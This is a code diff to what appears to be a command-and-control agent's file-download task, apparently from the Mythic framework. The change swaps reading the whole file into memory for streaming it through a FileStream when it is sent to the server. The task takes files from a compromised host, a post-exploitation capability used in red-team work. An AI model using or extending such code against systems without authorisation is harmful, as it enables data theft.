@@ -115,9 +115,6 @@ namespace Tasks
                 }
                 else
                 {
-                    byte[] fileBytes = new byte[0];
-                    fileBytes = File.ReadAllBytes(target.Path);
-
                     IMythicMessage[] artifacts = new IMythicMessage[1]
                     {
                         new Artifact
@@ -126,23 +123,27 @@ namespace Tasks
                             ArtifactDetails = target.Path
                         }
                     };
-                    if (_agent.GetFileManager().PutFile(
-                            _cancellationToken.Token,
-                            _data.ID,
-                            fileBytes,
-                            target.OriginatingPath,
-                            out string mythicFileId,
-                            false,
-                            target.Host))
+                    using (FileStream fileStream = new FileStream(target.Path, FileMode.Open, FileAccess.Read, FileShare.Read))
                     {
-                        resp = CreateTaskResponse("", true, "completed", artifacts);
-                    }
-                    else
-                    {
-                        resp = CreateTaskResponse(
-                            $"Download of {target.Path} failed or aborted.",
-                            true,
-                            "error", artifacts);
+                        if (_agent.GetFileManager().PutFile(
+                                _cancellationToken.Token,
+                                _data.ID,
+                                fileStream,
+                                fileStream.Length,
+                                target.OriginatingPath,
+                                out string mythicFileId,
+                                false,
+                                target.Host))
+                        {
+                            resp = CreateTaskResponse("", true, "completed", artifacts);
+                        }
+                        else
+                        {
+                            resp = CreateTaskResponse(
+                                $"Download of {target.Path} failed or aborted.",
+                                true,
+                                "error", artifacts);
+                        }
                     }
                 }
             }
